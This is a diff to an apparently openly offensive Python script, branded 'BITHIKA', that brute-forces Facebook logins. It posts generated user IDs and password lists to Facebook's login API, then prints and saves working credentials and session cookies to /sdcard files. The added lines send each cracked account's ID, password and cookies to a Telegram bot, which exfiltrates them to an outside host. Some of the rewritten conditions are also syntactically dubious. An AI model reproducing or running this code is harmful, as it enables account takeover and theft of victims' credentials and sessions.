@@ -981,17 +981,24 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        cid = str(po['uid'])
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(cid)
                                         cek_apk(coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(uid)
                                         break
-                        elif 'www.facebook.com' in po['error']['message']:
+                        elif 'access_token' in po:
+                                        cid = str(po['uid'])
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        statusok = (f" {cid} | {pas} | {coki} ")
+                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                                        break
+                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -1001,6 +1008,7 @@ def rndm1(uid,passlist):
                 loop+=1
         except Exception as e:
                 pass
+
                 
 #__________________| RANDOM METHOD M2 |__________________#
 def rndm2(uid,passlist):
@@ -1082,17 +1090,24 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        cid = str(po['uid'])
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                        oks.append(cid)
                                         cek_apk(coki)
-                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
-                                        oks.append(uid)
                                         break
-                        elif 'www.facebook.com' in po['error']['message']:
+                        elif 'access_token' in po:
+                                        cid = str(po['uid'])
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        statusok = (f" {cid} | {pas} | {coki} ")
+                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                                        break
+                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -1102,6 +1117,7 @@ def rndm2(uid,passlist):
                 loop+=1
         except Exception as e:
                 pass
+
                 
                 
 #__________________| RANDOM METHOD M3 |__________________#
@@ -1205,10 +1221,10 @@ def rndm3(uid,passlist):
                                         statusok = (f" {cid} | {pas} | {coki} ")
                                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                         break
-                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message']:
+                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
